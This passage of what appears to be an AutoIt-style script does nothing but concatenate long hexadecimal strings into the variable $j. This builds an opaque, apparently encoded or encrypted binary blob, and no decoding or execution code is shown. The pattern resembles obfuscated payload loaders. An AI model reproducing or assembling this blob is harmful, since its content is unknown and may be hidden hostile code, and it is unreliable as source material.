	$j = $j & "F1185DBC8AF0CBF16F7BC5D560410E5D6A305503B6E60D74E9F3358FA4B225A049A38C7F40900AFDFAE1E77E6E6438948AAB8DD0CAAAD9B8957144B13D39F0FEDB78A990A171DE0BC92A8FFA96619620079B8E5C445BA64E5F5424668B44334C7EA19ED85AA1E40A57EE7CE02B75BEE74BBEEF2E84A5698E1123E4B1AD4AD2F91E99840C3AFE6D9066B44A2188E8C03FB19A9E9BCAE6"
	$j = $j & "DAA82BED7EE22E3AF426DF6E90484A5660C893219AE40F50005BA23F3B787E901E75AAC8F47413D6ACDAFBC10F4A1996A9954812AD59160F2D6BAF4A622D331B5206C000F13969C6AFE7863E4C96C26627E61F5FCA5E3469577E372BB64CEC5DFD7D2F4D98FD1A5F5DB67DCB00D2F193245E8B0D9AAD149B0D335E3210497855667D612BD237A755534731CF70DED3C022E8788D6223"
	$j = $j & "DEECC38AF6AE3CE50A2105DAD84C0105C9D5419BF5DD4F3BD013C98AC3D3BF4363E3A0C48F07529BD55CED8AE3A90917A87A6F355989EB58154C937C3C820268BF18915B825E018D77143E34FF9908A0FA0056477898F260385F0AEB241E36E96B931556BB72AFBAAE04EA6A7956C177D67CF99A209419F4D88520C347153598F81A9B5CB2441B83303BC86F039D00B71ED5BCCF0ABB"
	$j = $j & "09E2156F86B7A09906E04ACD7C6E6982C8288066172BC88AF124149D21973FEBB039304991F6F257EAC83B3A9BE92341CE4F27061F8859E2B451D188D79B21971927472706B773B621376E514F37F91210BF6AA572480AE0ACDD65A7301F55FF9CFD0ADA6B614BF3D0BAB041894F428F6EA57C35B932A2776467029E68D4FBB5FDF55A4A076D5A8F943408795B6C935887C8E71F3C61"
	$j = $j & "4E02168B457EA9BAC63151A7D058639783635B2E278B00FA18FFC56CCF6B68DF8DC1CCE76D3F1E2BB2B3731B582C63BC487D5436D05C70EF785A24B9C2F2A6BCC03C453EF7DEC15E9C9D83B018874C10B1FC9D0DE84868DA6A72835EE7EA270E721B0C18B7B36EA12C6C6528C1709C58B639B052740691CD49279CB1AC236213BE6694266F3FDCD2341E20E2414863E5B0CA5A057505"
	$j = $j & "55E57DDAD85FC965B4491D26A58ECD4E4DF837C425B39D8AC85C515C693246ED1FFA689AC1D6C7A5A53BF03DD93D23B8D073283ACC33E3323520DD4662827337CCCEB616788C98B7E3E1A51343D40C1FED210FE056ABB439667EA7F8EBB51B8233278608FC864DE908680C440B877190B12BF92A92DD1CEFD58FCA319C79E75534DC2EB53802EA7DD51377273F58E17A4CDC0B4A72D2"
	$j = $j & "D41D6D4E5499C3B368CC88FC4272720DA613D83A6DA792A514C96433DBDD4BC0D88F06E5EA72C985A04DD890285D76B669BB85F7AB182ADFB2F5224580629EB2A1846E62DA718C4C455F683B0DFD1D451A0676D42C3E9B8A90D0A2BE65F7BC305B90071BA3C5A64B74593748AB423A0D88CA937C6FB03FC01BB7790F24790CFBA11851FF6F1DE53C460789A3CA5CF7AAEDE806DEC130"
	$j = $j & "EE1220ED2F25FCCFFD28A421928E0E9CF5E5F6F9593FD1EDF8865455F963220564D7494456465BA2B65A101797D1CC82565A1C15F4EC8AC57412671EDBFB839AA8D8C4B113D3EE23D255CA50F83C0E5426DD2076D1DC5437E4832C6362EB7BD0AE8D96F5504E0215FDE2466D43F1F1BD339C0C0C74C5A7AE6E14FB1F778D1E4C8991C2144067A8797279F71CE31FFC219877D184169A"
	$j = $j & "933FBDC08568692F3DAC95C308AEC6B740DFBC993ACDED317C302E8A96FE1D5034FFA1563A74BCF9261CA0841C6923DC130B581C2DF95D89C9A0BB364310E01A8465B6A1FF7D306F730A19C35832958F276F7FDFEDACC87E88CDB80D1BFB084B08983A9E15D526A47BEEA8EA29A46C58A4E95ED320FB422B1F7907427DA7ADC7672A075544EB9DA18CF8AF07A8323FC212432D5A1E08"
	$j = $j & "F5081D3EDC78D341AE0CA7D70856FAED6CBAFB193E106528F9FCBED6224F781A5AAEAEA750073AD48111E2C9DF9CD6A7D881EF7F1F702A9CE5A8E827726C93D726C9772B8D106139FE612567D1998E85EEC16D37FD52EA53B80988B7C102B6BD517B9623405BC9FE52D89D46570ED6D00388D18FF07F1AA88CB727D5DABFB1B4A68A94FD2B0A3850ACFC4D33A466B6D53B5F1E0260F3"
	$j = $j & "FD7EF407C23C87C50772E3EC08D6AF584A3B79DE9A6F5622EF866369DCD77B97CB35E12DEBF248FBDCB914CDAE86619993887A864209D28F8D771CFE84DA42DDEB83F9ABDD42C13609AEF3AC867BC521E6A8084BDA965F8EBC61C5E06EB12E135060C55348BCEEFA6112138C030BC08B3F8E46756F44BAC231618929E1CE6E169B63F8009F08189BDFD8199353816CCE213F37E47643"
	$j = $j & "AB746A754E6FA2C258A270A275AFCFF942496B69B99ACFA3367D5B7DDE662AA6CFFD51D412C4CB2BFFBAC0AE271486D6655DE89F9100ABAE32E843BFE41CA8B9B940AFE9ED7FE4552546B7A662ABB106A03ED8BC9A13C5B9B913A55908876BF0CFAE4682138429754ECEF24ABC41F83C3B27AAD0CBB424ADC5543D8D496F67FD4D7CE900FE5D92E9391B6854B2620BD4346216E38CF6"
	$j = $j & "9194385D089CCF48AB6534763B66750736D8C0F0BE7EE61AF6C6083BBF129105C63590ED803C21954CF67B14A61FEA1371FE51F40D2702F4624B545A4507B55D1FFF87E1AE7D1BC7D516A39F8D09B5DC68932801CFD470BDED0430A18CD1F98B6B6F19D0A3C6F995093A131F7FDB2BD5A0788F469134210910ED91AA81DDCA7834DF49B3F4FE941F5D99B2E0438B38D985F61E8FC31F"
	$j = $j & "10BDD6D5E029F7D4B63462748444255A4FE7A7F6389D0BBAA79E779DC36C1316E78701D23D9C799A49D22AF8D5B458C32FF7281D2200486F424E5B9E9F839170398BEE155565AFC358C9CB985B3153C567F02BE6B4736C5926250DC0FD045086C61EBA3C51D8DCCED6D118F89A725F56DF1904C7838BCE700334AE26B0824E32DECC2CE275A4782FFA55E329EDAEC5AD6A50EA204517"
	$j = $j & "6F56717A7F57CDCD37CB4EAEDD9DD729B6AA9598E58422C2D71658BE62DD6A283C824F31036A843E56B74F265BAEB4226A43DCE30A831BA380ACE835522F05928B9FBCD66BFE96A75ABBD8311993801BB9B92F3EFBBAAAD3EAC0E35343939472297080BCE33753B515E12912AB8C46B5414269C91213490CB1DF1CC60C7C05B2C0EEA2771288475D524B7AB5280E7EA375B8EBFFD3A9"
	$j = $j & "DD43CC69AD79B5E482AFB8E0EEBB323100DDC3148AE0EE6142C4806FA402E55D5FAFE4EA8070F6176B669A9296E79F254B1E0DF711136D98685522A0E585947ABF1BCFBCD1EFE5B63D49F6B7B85F0B1C61F512C0294F4901A2430146DB391D2BA548F75AB63A0186641A72C3DE7B69C79FEA994C7F4B57F982998B5AF65F5F213688DC2FCA7924290890A20A0E7E20FF43435217AC8E"
	$j = $j & "67E44CED889981093E5BD1E9DA43670B576A4A13E22418ABE448CEAAC16612C3CE2ACBA36945F43819132C35027D408CF1B514E126512786B532BB5C61FB16324434CAD5ADCD0EBC01BF6C0BFAA75731BF31ECA32235A7F5FAE5290B1C939258B12479AF71CED8A058C3EDF153C75723EBBDF0B594069F215DB807C893888533F198172DDAC55347BA9F156EF85A3B7D32F7849ADA9C"
	$j = $j & "6EE52413FFDD42F4A0EAC16FE2A78509A20AADD2D3FE9EC0749C84509A8F165823DCC1A083B047259E1179CC77C92A8DA0BC77CEC4DF3F165604D9815A5AECF0D92A2BF05A114750EF2530E0615B53D634A1D8915FB500464A72481D3F052220D12BE02B3CCBC0729BA183E2D5BEB10A9B19263508B79CB107544AE6458316EDA08DCF1065F7EE9B4AAB8DD025F3D205A47BC5B69593"
	$j = $j & "A7B302ADC10C00B20E49DB99A7DBFF62340F60FD175CB2277B808DC0606D55E757AD3EF21774527155B9D9B35EC8AFB0677879DDF683EDBE230ED447CD8FA5B620CDFA99E5DC7DFC8248A8D59D172BA012DB3C89D21A65CC649A44935291AA31458E523BD19AD5446C3B2BAA58E330B23773012E840712F68CA59E44B04809CFA7ABB23FBFFD47575647573E90ADFA022EBF1C6380D3"
	$j = $j & "1A415578A11ECE7D34ACD301BD1C87DBE208E113DE23A50B605AE3727D686963042F2A1443CDCF9D3987F2085F8BD560E86FDEB7FF8A4B8475AC110C23A60337E5A2FBC6B6B641BD76B9A3EC943D395A9BC33FB6CD61051C387755C0ED851E19D2ADD336DEC6FC4213D8F8E413E54261305B9F41D3139B59A97BF2B9C09391B64314EBB03EB20194CCE06A706F640285124ADEFDB923"
	$j = $j & "D074FA6940BE39C1665B4FD488B249F6DA1DF4B2A76FEC390AB013F11E418AB7C3B3A8BEC92526793C95120549B4D7ADF71E9B377B656159368D3961337072175ADBE29B392BC853ED25CC538CBDEC3C795CD6CD1D2E1727EB3DB1EF541C1B1CD3A8857047358D731673BBBB25BAA634636F0533187D4621E5F463519E4F41A0161770B1A7AC2E9E25ADCA4B3743EA5E7A068DACAC2C"
	$j = $j & "C452F54EE285A823E4217738673440DFB44A59D49AF96060AF5529AD09387FFB6C5DA47357B555A9EA7AA8C1EA0556A1C11CD55DAEB1D114116B679B2D11E41AEC7D05DD9521C19A72015F04008FEC347A9D0514FCB2BB8B6C88B5C2B295476527BBBAFA034B7947EBE4C614D0CC29BF68E9964DEC80927AAC99C6415BCB61D2D9E2DEF475D1FFA51BF1019CC40C04B92EC495CE1998"
	$j = $j & "05E3B27428D0592431E5D4227BFFBF7C57F0151B8900AB29A84D5675D9AD13FB053857368419B6AC86A255BF65639FB1DB187BE334A938CE7B1C9CD20C99BE652F732DC42C22C90C5F69665C6EF642C92ED66F39319762EBA8C4D436E34D9FCF431FB4370A1EA4E9A072948246B32AA4018E72CDAAE284487ECCF60AD25E7A34E2F76C520580A4AEF15FF61FDC6096E1F755EEE2D7D1"
	$j = $j & "1672F2099BF116735EFBB14B251DE966789D054BEA37D81AF8DC1721E8B5E58FC2FF64A7228E4890BD38B6A69425CFC3EE40940D7E1C87BCF3CFBFF5E756027BA6F932B75C433DE775810C84D1E6DF96AAB8FAB094AA56C80EBFCBC1261BC9C819CE9CDC4048F0B8DA4AEF6ED605F9698F38DC5402826D96CC57633A724FB3DE11DABBCC929710C33E21D098AC7EB506ECBEF450388B"
	$j = $j & "AF85F6EB9DA9ACC25FF1BF7A59CE2D2DDE2EEC0D6EA47A4C3463BA39122DC51C1649FC045A29CC912640656EEFE09832BD63102C260006A3A544352858F95055E0C41E3091921650CEFDEF71BF0337CAB3F1534FDAAB79397971D9A8F2801F661662EDABDF1C3DFCBBAB1C2E6D8DDE86DE625BE0D7C03B2FD7AB1118709426CF4C783AF7F8BE3DACF3DDF0B85FD8996B44EE1601FC22"
	$j = $j & "7624F29FA8762470AACD35D104A09BAE641F99A10022C8954F14C84205CF09C08F1E643E202A7C18FED26E7E79E96B91263CACF407EDE7ECA6B53A383B9DFBAACBBD93F2903D57BB58A9BBFA1B107257A9BCD8E454F0A2C99CF0BE97D4E079613920653118339A05F9CF010623A2D7AD9BAB84BA4F0E96CF3F3037EB7EA2FC5C5D55F0F7C5B4DE70C1E66728DFDAE5F4D5C1B89C8E82"
	$j = $j & "BC7CBDC640D528435ADAEB67395605AAB99602CD85423601140D38C3F96E56D065EF78C87B3E18CE2840026C1B04BCB4DA06F7B6097F1020258EAB045AE1E38D9BAD2CC5C737452B1FA96AC08D5EBD488648BD01C0C4F154816047A6305AD8A563E48CB942565634AC1A86CEA8DC100ACB86441FBEAD343C6FD1C99897CA55AC937B0C130C77F245246001AB60AEFB3CFD7CEE740617"
	$j = $j & "379619BB372666F062FF72386AEE5F2026F5E9B8EB6569F5EA98FE892F8E634AB4C0EA035F822097EDC791CDC26321E0B5C8DB0E43D8FCCDCD552EB04E524D9043C486B73C5F5F29ECB3370A63B601C822CF626A8F0D97A234A5CD2394190394436CA443BF1FF65398DD2C79968401CA677BFD2DDEA8A06BCD0FFB7516E2F88E1C132992BB17689A0C15080E800357F75B85474D191A"
	$j = $j & "782CAE230A662F515F239000A3967272A733CF5F7BD829B7A740C3B2BD0ECE323D67E4C69A30392D503FDEEDB4EA1BA1C92CBA961BAA420B864C445AF66BA13BD1FA577A324CABD61418DC3D5D8D07432A0BFB9A8CFCC2C16390AA2EE11194DF2B554B680E1D9AE95032FE881F085652213596798B9FD7A005DBE90D4DC4F57687A895D81EAB123BBA893E65CF8D3FCD464D9177092A"
	$j = $j & "45FDA8F5B0EED43B437B3B779810C3D00088930AFB218B7131D333D0585361B78E845617361B10202B8EDE944178480EABBBCC7C59BD377F2D81073BB9DBBFB83840292C3E9C778228CEDE826F73C1F48114A3EEA4E0C58B8563A6F117C59C21EB3F5DF75BE1534F6064436DF1F6BD813C28310C3F263726CB25705002EB539341773ACD1B0697F41C52A221BC23C683F4645475E014"
	$j = $j & "BBB33ECBFA39D7BB6ECE9DE5B681D92ABBDD74ACC20728F2F49AC5DB8AD52795D9EF74BDDA6A9C8C5A07E69E4C8DE3510C49CC08DE0263A0C649ED87EB1F81213FB74680921EB06347DC66A34057A96556FC7E6AC9BD34E8EE4352E08A1757E6AC10C4727D643F1E2EBB917D96CEA32200069137112DD9C7E9FD130317512670465EA4256C8B4965F7FF95794822FEFB112AE20A1401"
	$j = $j & "A90F4EC52798269532D72AA772DC06EC025DA31A900180547B705CBE7642BA040736F64504B6AC9855024374DC38FEEDC523CE1177E243CB15DFC4AFC1205D41E93298EE9AD96749E03C377B12E62D4D780BB13B46AD48EE9A6327A4A7869A7CCDB43804B24594A258EA58EB3783C42175B840300D27F632E7B1B41E65F5964DD2D094C88F5344CCFD6483DA998074084914D2DAE54A"
	$j = $j & "BA62D43C334022822A076BF7D0D0BB722CE2E749F6FCB0677EDCD9244444A0F7DAAFA47F2704B36E42C0CE822516397D54A102981D6D7C328F3A4522D349F7299A32F7DEB2885E15384364712D58F16AF4402CF41D981DB86C8C6AC98A9F529E30AB05955C231834A1BFB2BD32E477B087213072E8C7CA94055D5ADAB9E5DA0B26D1849EE6B7C304A9D3900C65ABDDBEB6801FEA6C04"
	$j = $j & "8CA4E0DD50AF8C9EE05DFA2CFB53E7251A3952DD254D369DAAE2AFFA27DED77D73ED4AAAF6EA37502AE93639A0A6697F628F39212EA2AFA392922E10C22E174903F455AA5B06109BDCDBE57CD63660504F03C0CC05DD68514386B228C701B234596557C37A8A8961C579ECEC59DB08F8F3D6F2D27773588DEC93415C1ABF11ADC8A1ED67BD719C4DECE2E15B290691E0FC2A130E9871"
	$j = $j & "CFB80221B57E304B8C231B89BC1FFD8847DF9901A454BFA2121CC9AB99C9E127FDFE4F9FABD1AF69AC5DA01F922A1EBEE506F7B9BE9346B50AB3822D846FBB433D314AA11F384B59F69232E0595B339ABED882B11BA898B6D19424D1227E791872DE613194E6A262955BBB455BDD2CE98422A239CC9670E4AE1E1ACA3B7E2988D81A82218411C33F7AD42AEACD4C459E95F3FBA1325C"
	$j = $j & "2D616DC960B68365CEC77B6E6BBF42B81BD0079A56A99A61E20309294D61B0A2AAF918C0D1693B6C06CF2DFEB24D0023477E5DDAC85ED94012B3C3CA148C3C14D11486EE3D7F5AAEB3F395ABF87A379F0A68A755D5C8E0E2D3B55FC1A41EB289BC1D8C4FDF673D3CB732C049002EF42DAE56B2E6E2298AC7179E41678CCB568E7E2251ADAB4CEBA0D788EF65B0903E8D2C1F97142830"
	$j = $j & "EFD4C10A8338C07D5A733C1D9D61637D35E4900CCE9C511BF5804AB3A3CB554314A9CFE3D567D194B66B59B99C0F2EB836DD96D453675A4A18714760B7CE246B1D1EC2544C0938295CCA3B3799082986C7E7281AD28588BDC163723A31F82D72F52A8384E5F8044402121393ABEA14B9692131CFC03A7D98653CADEE71D002AFE25700EDAA0172D051BC9DE14FAB6F3BA881B3D5D8A5"
	$j = $j & "5EC3C554084D07019455926AA754BA17DB5512F6F10B256D9843217D0A6204C819F1B34F8175A78DD064CF51AB1971368179F5D815E66293669AA11AE99A7960245D0E53D6727953D2213CF9628BBC3A741A7FED5DA68F54D46DA2F95B1476C9E5AA8053D0DB18838E9501B04539CE2997C825EE65D058DF878E719FA412F7A2CE83142A8B285F31F794F8E96B0D5AC258489A2DAF27"
	$j = $j & "25C1D2377222DB32BABD8A12360937A8AEA4F97FD824C34C103E666CC528CD19292FC30B7E33C4A70B2553C3668F9A5F339E8DD46FEA578553D5BF57365396E99F638552C8255CBCBE3FD17A99CD8655AF21F071FC2EA95CCA6D1CDDD9809D7B0DB88F61C862CB3BD768E9E713B0C7E3E669BA1DCB0A551661EF9F3EE973BDFDD49B30763A15BE0F753E4A354E82E96B1ED209CBA2D8"
	$j = $j & "3048532ABD7817C0E3B0F342111977D3E1E30D7C36981950E6A621468120F11B85EC2C44D992A1A2A67A9C5CE0851017A4969443C881D7DCF6986BF296248B1F6B32C0049943C56B904AEA78D166D181911B2E5887E8EF320A2E9F96DC4E057ED143C8D95506EFA38697DAFA5AE1C4EF07FBC6AD187CD1757F3F5F6EA9FC0E927C7AD84D6B3541CA1E29B60CC9802A137FCA290F7141"
	$j = $j & "A07614998FD389AD990F251769143F69E97B57A4629AB1230A11288528961A3E7E49859D83637FF0E6025F828B75E017250111202960CEAC39B2FFE71C06A2DC97F253BF06B5A7CDCA0A682629D7EAE8F2744F9BD92267EDD177F5AF62B85912E63F03FF0B914962DCD7A80B68C26C6C0F57460BF24B173A5F66CADEEC5746CCAD15A495018D73F619795C515DB21462FB7BE472B3F0"
	$j = $j & "8EE521F32E9306537ED805366E1B24917A370C6E8CB34895D532599F6650F11B98A207EB758D707BF633BD4167E455FC6767088791F7D41C494E92F94824C4D66661FCE1C9286CEF91EDCA7CE8CE0F05BD7E4A33754D0C44DB9BC9D994F9F1D53AE8A6055D2E25A52BA29F02DCAC4E6218C76B38EE810D36E35802D37B8BEDAE8C95969C34AAF34F4E62F4A9679D5088934F40D4EAAF"
	$j = $j & "CE74BAF8E0164D0D7490B38D2A449082E630B1FFDC4CC886A799988EFC3564F703CD9A341B2881706AB5EF761FCBD288057B8920AA441C3DDB60851B8F44D6C33D64CBF28FDBF563CA49319BF6E764710DCFA0A62BC5B87496F12E88651EE25FD0E7EE6565E2B90C7964006D6EF3BE57AE8C46D6ED94E7678FB67E8B2C965338998059D1F817786EE5B03ED532713B8CE8FE69600D1E"
	$j = $j & "C094343383A4EC53336DFF37A0CDC5B5BAE57E8F13E8D15C5A928CDA3D3627AB617CFAD10112C3BA86669690F7363E3F427BB671271E3257F94B16DBEEA22FB6272D70624845F18A8412CB39163AF68CD39EDA72A428C7DBE70BFBA04630AE56094E70CDDFD7D4A9158516A1617CC131806C113B14457210B7B1EDC1E6A01E4C408E4169D215B90F06334BC59280E1579E22542F4635"
	$j = $j & "65B3AAB5521AC1CC666CAF7566DC3C0EDDA0C07938395A2E245E0AB6C6D11E3CC76AFDFD4A1902AACF302DD9FD4F1627A4DCF3406998AFF0B1BC63EE83072714A114C9DFACA334E476F80E5A7BFE3C53CFD517764C0A413459704F5990CA5586B779C5666AF9D9385F04AD4C1E375CE71CBFCC668BAFFA1D34B9D8925A17D788F881D39E84FC52CE4F4DDC82F9619E1A93A4D6866B0E"
	$j = $j & "63C8254FE767F1EA7EEC2EB0FBE453FE31838D8ED115824DC4890C53ABB80290D4A0007D356652052093525B7C334C9FAC4512FD912DE55487DA3AED48D06E0667FDED52688BA8642D1BE2EDB4E1443915403FBDB299DE498B1EC01A0339534BFE59BA3FE1A70F00AC34F6A3983F83F2407B0247512EA88A6D53A7FAD1848EE020E67BBAA0BE52416C650DF9F6B026E064770257734E"
	$j = $j & "E6E1B0A08F095E956AD85E4C3489569DD628A544FD1CC8A6615FAFB1A58D1F6FF8A70B601C206FFECDCCA38D49736459F57D03F7B38C69F6BBBA7CEABF75ACBC19A562AE5136FF5AFF1881B708F7E0BAFAB4ED5A59488510EED1358BCD313334238ADAFCBC9D408495DF3BE1370F2367409C633FF471A3AA10B2C7B58FB7B4CFD5EC4CDD6EF211F84C119422681E4C53B6CB9BEAC8DA"
	$j = $j & "C924591AED89F1325965987ECAF1C0F5A786242F85001E2D8F0E3FBA843E95E5F37DD9D0D73717947B81E5AF3F59A86842198C3BD361E1BFD99DE507692886EA12CAD1C003B2877F9E0E5305F687E1D470BD5890F8A921EBA952BC990769C2000D587C003DB0D7C2EA47CD9E6C91AC8526511B3B59AB88DD12F974BC87DCA0DC48A2853B0817E83E40052D5888A6F648EEBB8ED2DF45"
	$j = $j & "20F61B876201E95EC0BA18954AFB88A80FE4A9804C29A2B6864EC48DCE9F9ACABAC6F5FB2D08C39B10AA483CBB408075B0A84BD0D71CAC13FAB7D218FA647FBB5C58C36FEB6AC26768783D68827CE1B34CC84947EF6D1E4CCA12CA86E2E601AC2D535BBA031E639B1AF872D8C23BE8E60DE738B0AEDC7B80D1E91663F18937536D6643E7CD78F01F8CBA59F07CDF83F1BCC0A04E340A"
	$j = $j & "26C70C8BED232A5B8ECB68B19CC96D150765B8C332BF4E0F088BF5502C465350524B2BADB755588120836008F5BBAC1A698766775FE023D30C08F5D7D613182FD7D98E44A0B54E32895F890DFB969F509A21035EC5EBE8B72CBC3C27E562D869C53D2405515376EDFD59C358AA11F8723E9A2A3845B7D689DEFEB18006F34EE68D6B049BA08AB9355BD06CFA640B711CAA8CCED08627"
	$j = $j & "672748517C878527E9D23DDE32EAC3003CCC67D8C46859B522004BA1CA0D8223B2EC7DA379D98E3BD016B8AA598F9D1235EBCB91121485042B4624FC8DC6A9BDBE0FF8DCE4A3185E90D241AD9F27BFA4EF3FD55EDCE51949F3ACA9AC698A2FE93E5030B1AA7CCD161C6AF37DFB9AA5EFE0F12CD25EC355D5C8064461372C0A231BFAF1F8DCF0DD875A3BA7573C7CE47DCBFF84DCFE57"
	$j = $j & "5808FC9147C87B24CE36B80B1AE64761110C35A433AB0B9076054F7E8D7F2C7C9952A358515EA22ADCB06629478B0762F1E0F6F268A1F11E23922C2BE455C7C112DC0A793C7CDE683CE8B70B2EFCC998B08787ADF0BBB4E845D2278AC67CA90B158EFB9BDC9B7AD47A64808B28EF42C40974D5A620A287D2C67910352FCC4E8A214693883817220857859BDC9A737645CE2FA55AC79E"
	$j = $j & "649ECD9AE5BA2867EF9FB00DB27A365B1F0E4A74819536BBE2107FDBAC326C34FFC92D7469486798619A16EB2781D91A78396C3D03DE62EA5BFB97747AC092B106BF9E664837F8D2D9E3781894184DB4F70B8F87310015B09369E121F62A816C6EB768274BAF42DBF340E4F07BA0D5E1D51B6FC3842251534E8CA06CDFF205C259B5DB6A0660FCDECF7223B94126747F1D4A9D0910C1"
	$j = $j & "1179AB91BEBA2AC1434790CACD5FC4A0E6DF6AB39ECCD10E6D293BB5854282842F02CE29D0AA676106429E386B74EBDD8EDFA9C87434BCB9EA74494EFC378B5FA4A5B6B1D2FFBE28B379137EE460DD5F820E57466C73BC7D6DC87DC625AE7392F1371BB2C0F85D96B66C96C313ED1B290C66EDDF9414D1661F51DE722EFAF2FD9CFE221AD20AA6FC0D00AE43B56EE5B7ABAEBEC580BF"
	$j = $j & "E6340E1D5104B71EA590DFCD8BEA063F42FDBF9CFCBC923848930F46BF5B0679446B39B733920335C692784FF1367CE4D20BECF594B9D92163D275F778E9CA780F36955F85855E307E4779FE8EDA47BAD3687EB0B96280C34A5E96A0DFC30FA3DC8FB3E0B2810702FF564CBDBA7FBA82DEE5CFD1BB73744D86CF18DE7F35FEBF3C7F8899AD42E2423BDAC928E7EBC9299043E8723DCC"
	$j = $j & "81100FAF0E339049E928510BEFF419639FF6E0629F591509BF40952FC623CFF4EECE31CFAA6F41DC0CD55C2784ACA54C7633985783DDBE572AD05E6C09A40E18A227AD3CAB91DF58A150249E4C5584DD4C97EDE3D8C128CE5318D7A28A3B2F1FD6ED4EFD250A210C47F7BE7183D844F1F4E3A2B8736B8B181405B72BCF0013F36A4A75640BDEBB9AC86132AEF24D1C82B6B6ECB83A19"
	$j = $j & "5A73CB5D5ED6B2B8DC92CCBFE0F94153E61010C762A619DF7BE011FC897860B2483A133399FAC296B5110E961448902798E816729536A2DA3797E4EF139FCD750CC6A4464734FD912CCD02D211530776C176A9EC57DD9EF10BBEB7752B1F6F48BF0A771E5AB577A2E086ED6979B272FAA913146F0C39F5ABA9CC94EE612B9F709F8519EC09C7916A70254ECC53D2E9EE0B6B19B627FF"
	$j = $j & "24BC6C9DAF0D18C030553A49E98F9772512EE4517FAC765F6799D97FF4782F0C2CE3B2A5C3863DB3D057A4B432F73B65476B7714FE185066E4F9807375D4AE2847555444F99CDA7F70F6204DBDB0129448E87577C4291BF653094974A330FB53E6C4E6B135D6C95211E72B78B9DA9FA97C3EA4C06EB4D94E021522F11D304A68543C12F6A3F34B5CE83538753A64671EF8CD13875FF6"
	$j = $j & "E11516BAC2DBB7BEDB20BCC97AD0A3932AB460990C6E02B27CCCAD99F8FF6F713302A619F574EFFC73E0C33AB902754F555E933C6C6439391BA52826AB5C74DD8BA3692A5E64C5C2B3B293A5C656FB30555A7FF89609222428A0D699DF16D8E7DDD5F1FBA8875DA5A9DA87243768031E80B38362E671F9E6914A59D300FA011B39276ED1EA7199172012AE4B46CF7787B5A8592EAA0A"
	$j = $j & "235EFA97EAAED501A4BACA6BCD0D83C796F2E30FB130F495CC13B5E8451DC046784D37AB136FEE7AF3BAFC3F0C905F1097B77A2D5490656DD16749727903FB595237B7E2C628CD7306055EE88AAFD1C703F4087C3A6C5434399F23A07709BE7C16D5B2FB40FC69235018BB3D586DF3178A5CBC1AAD4D9402F48127933EBFC2E4282A7E7C2301D5EEC592E385DA8AA1F5D9681148EB76"
	$j = $j & "6714FB595970476C1A2D19AAF84A09528DF12A2259097485C6FF0B4CBBC3AB1CDC576FB1D26997543D5F84CC3F78AFB174D668021A3B7ABD6AB62279B78CEF2D163DCB59488F4765F50CE8CC5FD32A583D9644C79DDF4CC2AB31BD88A2EB326C3F9967C40A63D82310BC8C2C3528A833356FBFF27FB227C369A91952336FDCB215A2AC761B9E3FA8FB695B77422C347618670F21C4DC"
	$j = $j & "D07583D24C10CA0E74A28DB064ABE721BAC32F9894578D8B97781AA18F7EA7D01A807F524B7060482FCA5C6FFD03855E4F3EC9F0FF69672E2DD856DF01B49AF1387B1BC9FD93E1A180AA1F924BFDBA92E7A690B4F25B487738559F205CAE2420CBEC375972E24AAB493AC6923D7E7DE0705EE2B15D4C618BD31F24A3BACB1DF097B2097692FE65ACC87CC725B44A19525B7051435935"
	$j = $j & "136CDBD10945C47076E8087F5F179CAAC2FF44EF2CF922A89E897E5D89AF1737BB9B641513440CB62119B9F9DCF9EA5A68117BE0E3CF37D7EF4BC97190BD4430CEEB93BC14D26178CAFD67B7417D14011830F4607284763F2526CE4C86502CEBD6A12EE6032D028F80C23FAA612B66F6CEB41E75AB92881347F49952BB9CBAF52B19FDB61CA7DA7D47799CD4806A8FE1E74A8534E03A"
	$j = $j & "B969A6B71DC862703BE6800A7D76DC8C51CE66D8B80040B2BD2E38F8ED1D12FA07B94579721F507016E6608EADA5DFCCF86A8049735F3D7C0C01712AD6647F5EAB62B865C8811F9FF4FA91251A9EF094230157FDAC01697B1C757376E8ED66033AB0ABDD742592B716366C6D9D2005B84BFAFA4FB6029476AAC68B2E505FF0E8C8E9F09C19973D19FB73F7FCE72BDA96087229D5047F"
	$j = $j & "93FAF345D5CF3017E50D173F33CF79D7357BF9638EA9C8B3D6A9B6967D8D5E4F54B53E833E0A15213ACB77B463B3D6BAE28C0FEC33A8646FAF1791CCC7E806CE166A3B29FBF5B885F426611513D06EAE4EF7DC0B55737A2BAB07E3BA3A51A94C93EBA639214EBE81A2927952FA5F361CF7DE0671DE42A7DB9CC4B0C3252D94E4E7232EFF75EB7ACEA8E47E7B6A5CC01CC8220202C0A7"
	$j = $j & "1F123988CE4698F15FCC6B94BE33E260B2AADDDEC7B0C954B824DF97B35C4E6F06FD8FCB3D4D6056F263FFAFF6DBBCB1EDE130F5C58BDAA076F6E77B6DC136B210EEC887023965508EA65D0423814E3144EF7E23BE2AA40B3A0FBB3028158873CC932CBEF6763FD222EA6CB1DB986EBC164D76E2534E858D319439880A0625457ECD2A955EE3D589B6B58B3D1C7A173DA8CF4797691B"
	$j = $j & "05F43CF6FC85F37A55F619A080024669251E72339731C03E8C561C271C984D848C3790F68BD726F48BCECCBB7ACCB3E8D80F5DF497B7ABCB2FE3CE61073FF184EECBDAEA48CD67A3D204C9D6AAFEFEC6EF0C7DB6C009BBC9BF89465C16BEDEFC0BE5595B47604CE721FD818126FCDF7AB7AA2CE69CCFCE48746E40855E33E91002175E99A82E7B737B7AA3D4C215117557E491FF6C29"
	$j = $j & "6507D156415452310600F7E477CC5E4596BDDF06ADFDD6195D4D4466BE82BE5B7A75D40E5AB899AA424EE3DA5480C4B22FAD29619C44C6C5F6D5CE1DBB4272A0A07958BC85D1C55F9C8B4B893C3C3EEE16AB380F7CDD742F8242B4D9CBB45748AE1E494739A70DDDCD5CBF4C78A6D9478709A67D6930ED01275A8DCACA8D9F75C1A1AD2DEFABD9DA69780156D7A808AD4911F1BEC5D3"
	$j = $j & "3C8A8EFC2BB8388573554AF53BFCD3EF4E7946A2D87691FC375FA8738F194B8F8E4F9C4E3FE93E08CE519025AD23B9EAE812BF343CCAFC967D938411AF4079EF9F2CFA9FA0D36EC9D100B23ED9CABA982D6EF4DF966CF6DC7C9A107C546F5D6369925E9345D6423AABFEB5C1377EF33B495988C336299243E54174EF141F8F050580707D1131C074983E2D2CE08961030E432D92381B"
